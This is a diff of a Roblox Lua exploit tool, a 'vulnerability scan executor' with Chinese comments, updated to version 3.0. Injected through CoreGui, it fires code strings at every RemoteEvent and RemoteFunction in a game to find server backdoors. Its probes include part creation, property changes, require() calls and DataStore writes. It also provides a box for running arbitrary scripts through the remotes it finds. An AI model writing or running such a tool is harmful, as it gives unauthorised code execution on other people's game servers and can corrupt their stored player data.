@@ -1,4 +1,4 @@
--- 漏洞扫描
+-- 高级漏洞扫描执行器 v3.0
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local Workspace = game:GetService("Workspace")
@@ -7,19 +7,24 @@ local ServerScriptService = game:GetService("ServerScriptService")
 local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
+local ServerStorage = game:GetService("ServerStorage")
+local StarterPlayer = game:GetService("StarterPlayer")
+local StarterPack = game:GetService("StarterPack")
+local TextService = game:GetService("TextService")
+local RunService = game:GetService("RunService")
 
 local LocalPlayer = Players.LocalPlayer
 
--- 创建主界面
-local function createScannerUI()
+-- 创建增强版主界面
+local function createAdvancedScannerUI()
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "VulnerabilityScanner"
+    screenGui.Name = "AdvancedVulnerabilityScanner"
     screenGui.Parent = CoreGui
     
     -- 主窗口
     local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 400, 0, 500)
-    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
+    mainFrame.Size = UDim2.new(0, 450, 0, 600)
+    mainFrame.Position = UDim2.new(0.5, -225, 0.5, -300)
     mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
     mainFrame.BorderSizePixel = 0
     mainFrame.Active = true
@@ -28,7 +33,7 @@ local function createScannerUI()
     
     -- 标题栏
     local titleBar = Instance.new("Frame")
-    titleBar.Size = UDim2.new(1, 0, 0, 30)
+    titleBar.Size = UDim2.new(1, 0, 0, 35)
     titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
     titleBar.BorderSizePixel = 0
     titleBar.Parent = mainFrame
@@ -36,7 +41,7 @@ local function createScannerUI()
     local titleLabel = Instance.new("TextLabel")
     titleLabel.Size = UDim2.new(1, -60, 1, 0)
     titleLabel.BackgroundTransparency = 1
-    titleLabel.Text = "漏洞扫描执行器 v2.1"
+    titleLabel.Text = "高级漏洞扫描执行器 v3.0"
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     titleLabel.Font = Enum.Font.GothamBold
     titleLabel.TextSize = 14
@@ -52,14 +57,14 @@ local function createScannerUI()
     
     -- 状态指示器
     local statusFrame = Instance.new("Frame")
-    statusFrame.Size = UDim2.new(0.9, 0, 0, 60)
-    statusFrame.Position = UDim2.new(0.05, 0, 0.08, 0)
+    statusFrame.Size = UDim2.new(0.9, 0, 0, 70)
+    statusFrame.Position = UDim2.new(0.05, 0, 0.07, 0)
     statusFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
     statusFrame.BorderSizePixel = 0
     statusFrame.Parent = mainFrame
     
     local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(1, 0, 0.6, 0)
+    statusLabel.Size = UDim2.new(1, 0, 0.5, 0)
     statusLabel.BackgroundTransparency = 1
     statusLabel.Text = "准备扫描"
     statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -70,14 +75,24 @@ local function createScannerUI()
     local statusLight = Instance.new("Frame")
     statusLight.Size = UDim2.new(0, 20, 0, 20)
     statusLight.Position = UDim2.new(0.5, -10, 0.7, 0)
-    statusLight.BackgroundColor3 = Color3.fromRGB(255, 255, 0) -- 黄色准备状态
+    statusLight.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
     statusLight.BorderSizePixel = 0
     statusLight.Parent = statusFrame
     
+    local progressLabel = Instance.new("TextLabel")
+    progressLabel.Size = UDim2.new(1, 0, 0, 20)
+    progressLabel.Position = UDim2.new(0, 0, 0.9, 0)
+    progressLabel.BackgroundTransparency = 1
+    progressLabel.Text = "进度: 0%"
+    progressLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    progressLabel.Font = Enum.Font.Gotham
+    progressLabel.TextSize = 12
+    progressLabel.Parent = statusFrame
+    
     -- 控制按钮区域
     local controlsFrame = Instance.new("Frame")
-    controlsFrame.Size = UDim2.new(0.9, 0, 0, 120)
-    controlsFrame.Position = UDim2.new(0.05, 0, 0.22, 0)
+    controlsFrame.Size = UDim2.new(0.9, 0, 0, 150)
+    controlsFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
     controlsFrame.BackgroundTransparency = 1
     controlsFrame.Parent = mainFrame
     
@@ -85,7 +100,7 @@ local function createScannerUI()
     local scanButton = Instance.new("TextButton")
     scanButton.Size = UDim2.new(1, 0, 0, 35)
     scanButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
-    scanButton.Text = "开始漏洞扫描"
+    scanButton.Text = "开始全面扫描"
     scanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     scanButton.Font = Enum.Font.Gotham
     scanButton.TextSize = 14
@@ -93,7 +108,7 @@ local function createScannerUI()
     
     -- 快速检测按钮
     local quickScanButton = Instance.new("TextButton")
-    quickScanButton.Size = UDim2.new(1, 0, 0, 35)
+    quickScanButton.Size = UDim2.new(0.48, 0, 0, 35)
     quickScanButton.Position = UDim2.new(0, 0, 0, 40)
     quickScanButton.BackgroundColor3 = Color3.fromRGB(80, 160, 80)
     quickScanButton.Text = "快速检测"
@@ -104,8 +119,8 @@ local function createScannerUI()
     
     -- 深度扫描按钮
     local deepScanButton = Instance.new("TextButton")
-    deepScanButton.Size = UDim2.new(1, 0, 0, 35)
-    deepScanButton.Position = UDim2.new(0, 0, 0, 80)
+    deepScanButton.Size = UDim2.new(0.48, 0, 0, 35)
+    deepScanButton.Position = UDim2.new(0.52, 0, 0, 40)
     deepScanButton.BackgroundColor3 = Color3.fromRGB(180, 80, 80)
     deepScanButton.Text = "深度扫描"
     deepScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -113,10 +128,60 @@ local function createScannerUI()
     deepScanButton.TextSize = 14
     deepScanButton.Parent = controlsFrame
     
+    -- 高级扫描按钮
+    local advancedScanButton = Instance.new("TextButton")
+    advancedScanButton.Size = UDim2.new(1, 0, 0, 35)
+    advancedScanButton.Position = UDim2.new(0, 0, 0, 80)
+    advancedScanButton.BackgroundColor3 = Color3.fromRGB(160, 80, 160)
+    advancedScanButton.Text = "高级扫描"
+    advancedScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    advancedScanButton.Font = Enum.Font.Gotham
+    advancedScanButton.TextSize = 14
+    advancedScanButton.Parent = controlsFrame
+    
+    -- 停止扫描按钮
+    local stopScanButton = Instance.new("TextButton")
+    stopScanButton.Size = UDim2.new(1, 0, 0, 35)
+    stopScanButton.Position = UDim2.new(0, 0, 0, 120)
+    stopScanButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    stopScanButton.Text = "停止扫描"
+    stopScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    stopScanButton.Font = Enum.Font.Gotham
+    stopScanButton.TextSize = 14
+    stopScanButton.Parent = controlsFrame
+    
+    -- 漏洞列表区域
+    local vulnListFrame = Instance.new("Frame")
+    vulnListFrame.Size = UDim2.new(0.9, 0, 0, 120)
+    vulnListFrame.Position = UDim2.new(0.05, 0, 0.45, 0)
+    vulnListFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+    vulnListFrame.BorderSizePixel = 0
+    vulnListFrame.Parent = mainFrame
+    
+    local vulnListLabel = Instance.new("TextLabel")
+    vulnListLabel.Size = UDim2.new(1, 0, 0, 25)
+    vulnListLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+    vulnListLabel.Text = "发现的漏洞 (" .. 0 .. ")"
+    vulnListLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    vulnListLabel.Font = Enum.Font.Gotham
+    vulnListLabel.TextSize = 12
+    vulnListLabel.Parent = vulnListFrame
+    
+    local vulnScrollFrame = Instance.new("ScrollingFrame")
+    vulnScrollFrame.Size = UDim2.new(1, -10, 1, -35)
+    vulnScrollFrame.Position = UDim2.new(0, 5, 0, 25)
+    vulnScrollFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    vulnScrollFrame.BorderSizePixel = 0
+    vulnScrollFrame.ScrollBarThickness = 8
+    vulnScrollFrame.Parent = vulnListFrame
+    
+    local vulnListLayout = Instance.new("UIListLayout")
+    vulnListLayout.Parent = vulnScrollFrame
+    
     -- 脚本输入区域
     local scriptFrame = Instance.new("Frame")
-    scriptFrame.Size = UDim2.new(0.9, 0, 0, 180)
-    scriptFrame.Position = UDim2.new(0.05, 0, 0.45, 0)
+    scriptFrame.Size = UDim2.new(0.9, 0, 0, 150)
+    scriptFrame.Position = UDim2.new(0.05, 0, 0.68, 0)
     scriptFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
     scriptFrame.BorderSizePixel = 0
     scriptFrame.Parent = mainFrame
@@ -147,7 +212,7 @@ local function createScannerUI()
     -- 执行控制区域
     local executeFrame = Instance.new("Frame")
     executeFrame.Size = UDim2.new(0.9, 0, 0, 80)
-    executeFrame.Position = UDim2.new(0.05, 0, 0.85, 0)
+    executeFrame.Position = UDim2.new(0.05, 0, 0.92, 0)
     executeFrame.BackgroundTransparency = 1
     executeFrame.Parent = mainFrame
     
@@ -185,9 +250,14 @@ local function createScannerUI()
         Elements = {
             statusLabel = statusLabel,
             statusLight = statusLight,
+            progressLabel = progressLabel,
             scanButton = scanButton,
             quickScanButton = quickScanButton,
             deepScanButton = deepScanButton,
+            advancedScanButton = advancedScanButton,
+            stopScanButton = stopScanButton,
+            vulnListLabel = vulnListLabel,
+            vulnScrollFrame = vulnScrollFrame,
             scriptBox = scriptBox,
             executeButton = executeButton,
             clearButton = clearButton,
@@ -198,15 +268,17 @@ local function createScannerUI()
 end
 
 -- 初始化扫描器
-local Scanner = createScannerUI()
+local Scanner = createAdvancedScannerUI()
 local scanInProgress = false
 local detectedVulnerabilities = {}
+local totalObjectsScanned = 0
+local totalObjectsToScan = 0
 
 -- 通知函数
 local function notify(message)
     pcall(function()
         StarterGui:SetCore("SendNotification", {
-            Title = "漏洞扫描器",
+            Title = "高级漏洞扫描器",
             Text = message,
             Duration = 3
         })
@@ -220,7 +292,52 @@ local function updateStatus(text, color)
     Scanner.Elements.statusLight.BackgroundColor3 = color
 end
 
--- 检测远程对象
+-- 更新进度
+local function updateProgress(current, total)
+    if total > 0 then
+        local percent = math.floor((current / total) * 100)
+        Scanner.Elements.progressLabel.Text = "进度: " .. percent .. "%"
+    end
+end
+
+-- 更新漏洞列表
+local function updateVulnerabilityList()
+    Scanner.Elements.vulnListLabel.Text = "发现的漏洞 (" .. #detectedVulnerabilities .. ")"
+    
+    -- 清空现有列表
+    for _, child in ipairs(Scanner.Elements.vulnScrollFrame:GetChildren()) do
+        if child:IsA("TextButton") then
+            child:Destroy()
+        end
+    end
+    
+    -- 添加漏洞项
+    for i, vuln in ipairs(detectedVulnerabilities) do
+        local vulnButton = Instance.new("TextButton")
+        vulnButton.Size = UDim2.new(1, 0, 0, 25)
+        vulnButton.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
+        vulnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        vulnButton.Text = vuln.type .. ": " .. vuln.name
+        vulnButton.TextXAlignment = Enum.TextXAlignment.Left
+        vulnButton.Font = Enum.Font.Gotham
+        vulnButton.TextSize = 11
+        vulnButton.Parent = Scanner.Elements.vulnScrollFrame
+        
+        -- 悬停提示
+        vulnButton.MouseEnter:Connect(function()
+            vulnButton.BackgroundColor3 = Color3.fromRGB(80, 80, 85)
+        end)
+        
+        vulnButton.MouseLeave:Connect(function()
+            vulnButton.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
+        end)
+    end
+    
+    -- 更新滚动区域大小
+    Scanner.Elements.vulnScrollFrame.CanvasSize = UDim2.new(0, 0, 0, #detectedVulnerabilities * 25)
+end
+
+-- 扩展的远程对象验证
 local function checkRemoteObject(obj)
     if obj.ClassName ~= "RemoteEvent" and obj.ClassName ~= "RemoteFunction" then
         return false
@@ -231,27 +348,17 @@ local function checkRemoteObject(obj)
         return false
     end
     
-    -- 检查可疑名称模式
-    local name = obj.Name:lower()
-    local suspiciousPatterns = {
-        "admin", "execute", "script", "command", "backdoor",
-        "hack", "exploit", "remote", "server", "client"
-    }
-    
-    for _, pattern in ipairs(suspiciousPatterns) do
-        if name:find(pattern) then
-            return true
-        end
-    end
-    
-    return false
+    -- 检查所有远程对象，不限于特定名称模式
+    return true
 end
 
--- 测试漏洞
+-- 增强的漏洞测试方法
 local function testVulnerability(remote)
     local testId = "Test_" .. tostring(math.random(10000, 99999))
+    local vulnerabilityFound = false
+    local vulnerabilityType = ""
     
-    -- 测试方法1: 基本代码执行
+    -- 测试方法1: 基本代码执行 - 创建部件
     local testCode1 = string.format(
         "local p=Instance.new('Part',workspace)p.Name='%s'",
         testId
@@ -266,37 +373,130 @@ local function testVulnerability(remote)
     end)
     
     if success1 then
-        wait(0.5)
+        wait(0.3)
         if Workspace:FindFirstChild(testId) then
             Workspace:FindFirstChild(testId):Destroy()
-            return true
+            vulnerabilityFound = true
+            vulnerabilityType = "代码执行-创建部件"
         end
     end
     
     -- 测试方法2: 字符串值创建
-    local testCode2 = string.format(
-        "local s=Instance.new('StringValue',workspace)s.Name='%s's.Value='SUCCESS'",
-        testId
-    )
-    
-    local success2 = pcall(function()
-        if remote.ClassName == "RemoteEvent" then
-            remote:FireServer(testCode2)
-        else
-            remote:InvokeServer(testCode2)
-        end
-    end)
-    
-    if success2 then
-        wait(0.5)
-        local testObj = Workspace:FindFirstChild(testId)
-        if testObj and testObj.Value == "SUCCESS" then
-            testObj:Destroy()
-            return true
+    if not vulnerabilityFound then
+        local testCode2 = string.format(
+            "local s=Instance.new('StringValue',workspace)s.Name='%s's.Value='SUCCESS'",
+            testId
+        )
+        
+        local success2 = pcall(function()
+            if remote.ClassName == "RemoteEvent" then
+                remote:FireServer(testCode2)
+            else
+                remote:InvokeServer(testCode2)
+            end
+        end)
+        
+        if success2 then
+            wait(0.3)
+            local testObj = Workspace:FindFirstChild(testId)
+            if testObj and testObj.Value == "SUCCESS" then
+                testObj:Destroy()
+                vulnerabilityFound = true
+                vulnerabilityType = "代码执行-创建字符串"
+            end
         end
     end
     
-    return false
+    -- 测试方法3: 修改属性
+    if not vulnerabilityFound then
+        local testPart = Instance.new("Part")
+        testPart.Name = testId
+        testPart.Parent = Workspace
+        
+        local testCode3 = string.format(
+            "workspace['%s'].BrickColor=BrickColor.new('Bright red')",
+            testId
+        )
+        
+        local success3 = pcall(function()
+            if remote.ClassName == "RemoteEvent" then
+                remote:FireServer(testCode3)
+            else
+                remote:InvokeServer(testCode3)
+            end
+        end)
+        
+        if success3 then
+            wait(0.3)
+            if testPart.BrickColor == BrickColor.new("Bright red") then
+                vulnerabilityFound = true
+                vulnerabilityType = "属性修改"
+            end
+        end
+        
+        testPart:Destroy()
+    end
+    
+    -- 测试方法4: 服务端函数调用
+    if not vulnerabilityFound then
+        local testCode4 = "game:GetService('Players'):GetChildren()"
+        
+        local success4, result = pcall(function()
+            if remote.ClassName == "RemoteEvent" then
+                remote:FireServer(testCode4)
+                return true
+            else
+                return remote:InvokeServer(testCode4)
+            end
+        end)
+        
+        if success4 and result then
+            vulnerabilityFound = true
+            vulnerabilityType = "服务端函数调用"
+        end
+    end
+    
+    -- 测试方法5: require模块执行
+    if not vulnerabilityFound then
+        local testCode5 = "require(0000000000)"
+        
+        local success5 = pcall(function()
+            if remote.ClassName == "RemoteEvent" then
+                remote:FireServer(testCode5)
+            else
+                remote:InvokeServer(testCode5)
+            end
+        end)
+        
+        if success5 then
+            vulnerabilityFound = true
+            vulnerabilityType = "模块加载"
+        end
+    end
+    
+    -- 测试方法6: 数据存储操作
+    if not vulnerabilityFound then
+        local testCode6 = "game:GetService('DataStoreService'):GetDataStore('Test'):SetAsync('Test','Value')"
+        
+        local success6 = pcall(function()
+            if remote.ClassName == "RemoteEvent" then
+                remote:FireServer(testCode6)
+            else
+                remote:InvokeServer(testCode6)
+            end
+        end)
+        
+        if success6 then
+            vulnerabilityFound = true
+            vulnerabilityType = "数据存储操作"
+        end
+    end
+    
+    if vulnerabilityFound then
+        return true, vulnerabilityType
+    end
+    
+    return false, ""
 end
 
 -- 扫描位置
@@ -307,14 +507,20 @@ local function scanLocation(location, scanType)
     for _, obj in ipairs(objects) do
         if not scanInProgress then break end
         
+        totalObjectsScanned = totalObjectsScanned + 1
+        updateProgress(totalObjectsScanned, totalObjectsToScan)
+        
         if checkRemoteObject(obj) then
-            if testVulnerability(obj) then
+            local isVulnerable, vulnType = testVulnerability(obj)
+            if isVulnerable then
                 table.insert(detectedVulnerabilities, {
                     object = obj,
-                    location = location:GetFullName(),
-                    type = obj.ClassName
+                    name = obj:GetFullName(),
+                    type = vulnType,
+                    location = location:GetFullName()
                 })
                 found = found + 1
+                updateVulnerabilityList()
                 
                 if scanType == "quick" then
                     break -- 快速扫描只找第一个漏洞
@@ -326,6 +532,30 @@ local function scanLocation(location, scanType)
     return found
 end
 
+-- 计算总扫描对象数
+local function calculateTotalObjects()
+    local total = 0
+    local scanLocations = {
+        ReplicatedStorage,
+        Workspace,
+        Lighting,
+        ServerScriptService,
+        ServerStorage,
+        StarterPlayer,
+        StarterPack,
+        game:GetService("StarterGui"),
+        game:GetService("SoundService"),
+        game:GetService("Chat"),
+        game:GetService("LocalizationService")
+    }
+    
+    for _, location in ipairs(scanLocations) do
+        total = total + #location:GetDescendants()
+    end
+    
+    return total
+end
+
 -- 执行扫描
 local function performScan(scanType)
     if scanInProgress then
@@ -335,15 +565,35 @@ local function performScan(scanType)
     
     scanInProgress = true
     detectedVulnerabilities = {}
-    updateStatus("扫描中...", Color3.fromRGB(255, 255, 0))
+    totalObjectsScanned = 0
+    updateVulnerabilityList()
     
     local scanLocations = {
         ReplicatedStorage,
         Workspace,
         Lighting,
         ServerScriptService,
-        game:GetService("ServerStorage")
+        ServerStorage,
+        StarterPlayer,
+        StarterPack,
+        game:GetService("StarterGui"),
+        game:GetService("SoundService"),
+        game:GetService("Chat"),
+        game:GetService("LocalizationService")
     }
+    
+    if scanType == "quick" then
+        scanLocations = {ReplicatedStorage, Workspace}
+    elseif scanType == "deep" then
+        -- 深度扫描包含所有位置
+    elseif scanType == "advanced" then
+        -- 高级扫描额外扫描游戏本身
+        table.insert(scanLocations, game)
+    end
+    
+    totalObjectsToScan = calculateTotalObjects()
+    updateStatus("扫描中...", Color3.fromRGB(255, 255, 0))
+    updateProgress(0, totalObjectsToScan)
     
     local totalFound = 0
     
@@ -412,6 +662,13 @@ local function executeScript()
     notify(string.format("执行结果: %d 成功, %d 失败", successCount, failCount))
 end
 
+-- 停止扫描
+local function stopScan()
+    scanInProgress = false
+    updateStatus("已停止", Color3.fromRGB(255, 0, 0))
+    notify("扫描已停止")
+end
+
 -- 绑定事件
 Scanner.Elements.scanButton.MouseButton1Click:Connect(function()
     performScan("normal")
@@ -424,6 +681,12 @@ end)
 Scanner.Elements.deepScanButton.MouseButton1Click:Connect(function()
     performScan("deep")
 end)
+
+Scanner.Elements.advancedScanButton.MouseButton1Click:Connect(function()
+    performScan("advanced")
+end)
+
+Scanner.Elements.stopScanButton.MouseButton1Click:Connect(stopScan)
 
 Scanner.Elements.executeButton.MouseButton1Click:Connect(executeScript)
 
@@ -438,6 +701,6 @@ end)
 
 -- 初始化完成
 updateStatus("就绪", Color3.fromRGB(255, 255, 0))
-notify("漏洞扫描执行器已加载")
+notify("高级漏洞扫描执行器已加载")
 
-print("漏洞扫描执行器 v2.1 - 已初始化")
+print("高级漏洞扫描执行器 v3.0 - 已初始化")
